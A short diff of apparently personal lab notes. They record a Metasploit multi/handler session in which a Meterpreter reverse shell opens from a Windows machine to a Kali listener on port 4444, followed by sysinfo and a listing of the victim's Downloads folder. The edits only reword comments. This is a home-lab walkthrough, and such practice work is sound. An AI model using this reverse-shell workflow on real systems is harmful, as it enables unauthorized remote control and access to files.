@@ -47,7 +47,7 @@ msf6 exploit(multi/handler) > exploit
 [*] Sending stage (175174 bytes) to <windowsip>
 [*] Meterpreter session 1 opened (192.168.1.2:4444 -> 192.168.1.3:2352 ) at 2022-02-28 00:55:06 -0500
 
-# you have now spawned reverse shell with meterpreter # 
+# meterpreter session spawned # 
 
 meterpreter > sysinfo <br>
  
@@ -73,7 +73,7 @@ Meterpreter     : x86/windows<br>
 meterpreter > ls<br>
 > Listing: C:\Users\Gregster\Downloads<br>
 
-## vefify that the file is there list and then look at it in windows machine, change directories in meterpreter, stop apache2 call it a night tbc... #<br>
+## vefify that the file is there list and then look at it in windows machine, change directories in meterpreter, stop apache2 ... #<br>
 <br>
 ┌──(root💀kali)-[/g]
 └─# systemctl stop apache2  
